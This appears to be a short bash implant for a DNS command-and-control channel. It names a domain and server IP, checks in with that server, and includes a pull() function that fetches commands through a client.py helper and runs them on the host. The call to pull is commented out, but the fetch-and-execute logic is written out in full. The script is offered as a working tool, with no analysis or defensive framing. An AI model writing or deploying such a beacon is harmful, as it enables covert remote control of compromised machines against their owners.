#!/bin/bash
# Beacon to DNS server 

domain="doshcloud.com"
chkdomain="check.doshcloud.com"
dnsServer="129.21.130.212"
f=false

# Pull down commands from server
pull(){

    cmd=$(python client.py -t T $domain)
    first=$(echo $cmd | awk '{print $1}')
    if [[ $first == "file" ]]; then
        f=true
    else
        $cmd
    fi
}

# Check in with server show beacon is still alive
check(){
    cmd=$(python client.py $chkdomain)
    echo $cmd
}

# Main driver for beacon
main(){
    #pull
    check
}

main
